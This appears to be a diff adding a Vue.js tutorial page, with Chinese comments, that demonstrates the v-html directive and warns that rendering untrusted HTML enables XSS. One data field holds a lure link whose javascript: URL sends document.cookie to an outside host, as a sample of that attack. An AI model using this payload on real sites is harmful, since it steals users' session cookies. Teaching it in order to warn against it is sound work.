@@ -1,0 +1,50 @@
+<! Document html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <title>初识Vue</title>
+        <!-- 引用Vue -->
+        <!-- https://www.bilibili.com/video/BV1Zy4y1K7SH/?p=4&spm_id_from=pageDriver&vd_source=c20fdee8eb71a2604ed4f84d382f798f -->
+        <script type="text/javascript" src="../../js/vue.js"></script>
+    </head>
+    <body>
+        <!--
+            我们学过的指令：
+             v-bind 单向绑定解析表达式，可简写为:xxx
+             v-model 双身绑定数据
+             v-for 遍历数组｜对象｜字符中
+             v-on  绑定事件监听，可以简写为@
+             v-if  条件渲染（动态控制节点是否存在）
+             v-else 条件渲染（动态控制节点是否存在）
+             v-show 条件渲染 （动态控制节点是否展示）
+
+             v-html指令
+              1）作用 向其所在的节点渲染内容。
+              2）会解析Html内容有潜在风险
+            
+            严重注意：
+                1）在网站上动态的渲染任意HTML内容是非常危险的,容易导致XSS攻击
+                2)一定要在可信的内容上使用v-html,永不要用在用户提交的内容上!
+
+        -->
+        <div id="root">
+            <div>{{name}} - 你好！</div>
+            <div v-text="name"></div>
+            <div v-text="str"></div>
+            <div v-html="str2"></div>
+        </div>
+
+        <script type="text/javascript">
+            Vue.config.productionTip = false  // 阻止Vue 在启动时生成的生产提示
+            // v-on ,v-bind 
+            const vm=new Vue({
+                el:"#root",
+                data:{
+                    name:'huangg',
+                    str:'<h3 style="color:red;">hello!!!</h3>',
+                    str2:'<a href=javascript:location.href="https://www.bootcdn.cn?"+document.cookie>哥哥，我找到你要的资源了！</a>'                
+                }
+            })
+        </script>
+    </body>
+</html>
